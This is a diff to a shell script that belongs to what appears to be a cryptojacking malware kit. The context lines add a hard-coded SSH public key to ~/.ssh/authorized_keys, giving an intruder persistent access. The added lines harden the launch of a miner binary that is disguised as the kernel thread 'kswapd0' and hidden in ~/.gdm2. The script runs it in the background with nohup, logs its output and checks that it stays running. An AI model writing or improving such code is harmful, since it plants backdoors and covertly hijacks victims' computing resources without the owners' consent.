@@ -386,6 +386,22 @@ touch ~/.ssh/authorized_keys
 echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDPrkRNFGukhRN4gwM5yNZYc/ldflr+Gii/4gYIT8sDH23/zfU6R7f0XgslhqqXnbJTpHYms+Do/JMHeYjvcYy8NMYwhJgN1GahWj+PgY5yy+8Efv07pL6Bo/YgxXV1IOoRkya0Wq53S7Gb4+p3p2Pb6NGJUGCZ37TYReSHt0Ga0jvqVFNnjUyFxmDpq1CXqjSX8Hj1JF6tkpANLeBZ8ai7EiARXmIHFwL+zjCPdS7phyfhX+tWsiM9fm1DQIVdzkql5J980KCTNNChdt8r5ETre+Yl8mo0F/fw485I5SnYxo/i3tp0Q6R5L/psVRh3e/vcr2lk+TXCjk6rn5KJirZWZHlWK+kbHLItZ8P2AcADHeTPeqgEU56NtNSLq5k8uLz9amgiTBLThwIFW4wjnTkcyVzMHKoOp4pby17Ft+Edj8v0z1Xo/WxTUoMwmTaQ4Z5k6wpo2wrsrCzYQqd6p10wp2uLp8mK5eq0I2hYL1Dmf9jmJ6v6w915P2aMss+Vpp0='>>~/.ssh/authorized_keys
 chmod 600 ~/.ssh/authorized_keys
 
-$HOME/.gdm2/kswapd0
+# Running the miner
+if [ ! -x "$HOME/.gdm2/kswapd0" ]; then
+  echo "Miner executable not found or not executable"
+  exit 1
+fi
+
+echo "Starting kswapd0 miner..."
+# Detail the command to ensure it uses the correct config
+nohup $HOME/.gdm2/kswapd0 --config=$HOME/.gdm2/config.json > $HOME/.gdm2/miner.log 2>&1 &
+
+# Confirm it is running
+if pgrep -f "kswapd0" > /dev/null; then
+  echo "kswapd0 is running successfully."
+else
+  echo "Failed to start kswapd0."
+fi
+
 
 echo "[*] Setup complete"
